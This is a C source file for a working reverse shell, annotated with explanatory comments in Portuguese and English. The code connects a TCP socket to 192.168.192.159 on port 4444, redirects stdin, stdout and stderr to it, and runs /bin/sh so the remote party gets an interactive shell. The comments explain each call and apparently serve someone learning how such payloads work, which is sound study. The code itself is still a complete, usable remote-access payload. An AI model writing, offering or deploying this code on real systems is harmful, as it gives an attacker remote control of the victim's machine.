#include <unistd.h>
#include <stdio.h>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>

int main(int argc, char *argv[])
{
    // define struct saddress
    struct sockaddr_in saddress;
    /*
    Em suma é essa estrutura que lida com os endereços de rede.
    struct sockaddr_in {
    short            sin_family;
    unsigned short   sin_port;
    struct in_addr   sin_addr;
    char             sin_zero[8];
};
    Essa em particular é a estrutura usada com endereços IPv4, por exemplo 192.168.123.123.

Além dessa estrutura existem diversas outras estruturas básicas para todos os sistemas e funções que lidam com os endereços da internet. Muitas vezes você usará getaddrinfo () para preencher essas estruturas e depois as lê quando for necessário.
    */

    int socketid;

    // declare struct variables (remote host IP address, port..)
    saddress.sin_family = AF_INET; //For communicating between processes on different hosts connected by IPV4, we use AF_INET
    saddress.sin_addr.s_addr = inet_addr("192.168.192.159"); //The inet_addr() function shall convert the string pointed to by cp, in the standard IPv4 dotted decimal notation, to an integer value suitable for use as an Internet address. Serve pra converter a string em um endereço IP
    saddress.sin_port = htons(4444); //mesma coisa da função acima, serve pra converter o inteiro pra ser utilizado como porta em um pacote.

    // create socket
    socketid = socket(AF_INET, SOCK_STREAM, 0);
    /*
    int sockfd = socket(domain, type, protocol)
    sockfd: socket descriptor, an integer (like a file handle)
domain: integer, specifies communication domain. We use AF_ LOCAL as defined in the POSIX standard for communication between processes on the same host. For communicating between processes on different hosts connected by IPV4, we use AF_INET and AF_I NET 6 for processes connected by IPV6.
type: communication type
SOCK_STREAM: TCP(reliable, connection-oriented)
SOCK_DGRAM: UDP(unreliable, connectionless)
protocol: Protocol value for Internet Protocol(IP), which is 0. This is the
same number that appears on the protocol field in the IP header of a
packet.(man protocols for more details)
Ou seja, estamos definindo um socket IPV4, que usa TCP e usa o protocolo IP */

    // connect to remote IP address/port
    connect(socketid, (struct sockaddr *)&saddress, sizeof(saddress));
    /*
    On the client, the connect() system call establishes a connection to the server.

int connect(int sockfd, struct sockaddr *serv_addr, int addrlen);
■
The first parameter is the socket descriptor from the socket() call, sockfd.

■
The second parameter is the server’s sockaddr address, to be filled in.

■
The third parameter is the length of the server’s sockaddr structure.
    Ou seja, ele irá conectar no nosso socket e utilizar as informações de socket que definimos, no segundo parãmetro ele vai pegar a nossa struct onde definimos o IP e a porta e no terceiro o tamanho da nossa struct.
*/
    // copy STDIN, STDOUT and STDERR to socket
    dup2(socketid, 0);
    dup2(socketid, 1);
    dup2(socketid, 2);
    /*
    A função dup2() em sistemas Unix é usada para duplicar um descritor de arquivo existente para outro número de descritor de arquivo específico. A assinatura típica da função dup2() é a seguinte:
    int dup2(int oldfd, int newfd);
oldfd: é o descritor de arquivo existente que você deseja duplicar.
newfd: é o novo número de descritor de arquivo para o qual o descritor de arquivo será duplicado.
A função dup2() fecha qualquer descritor de arquivo existente que já esteja associado ao newfd antes de duplicar o oldfd para newfd. Se oldfd e newfd já forem iguais, dup2() retorna newfd sem fechar ou duplicar qualquer descritor de arquivo.

O que ela está fazendo e passando o stdin, sterror e stdout para o nosso socket. Então qualquer entrada ou saída será passado pra nossa conexão estabelecida, dessa forma quem estiver do outro lado vai receber o stdout. Se printarmos algo, sairá lá. */

    // execute /bin/sh 
    execve("/bin/sh", 0, 0);
    //executamos o /bin/bash. Como o stdout e stdin está para o socket, quem estiver do outro lado poderá ver a saída e poderá interagir.
    return 0;
}
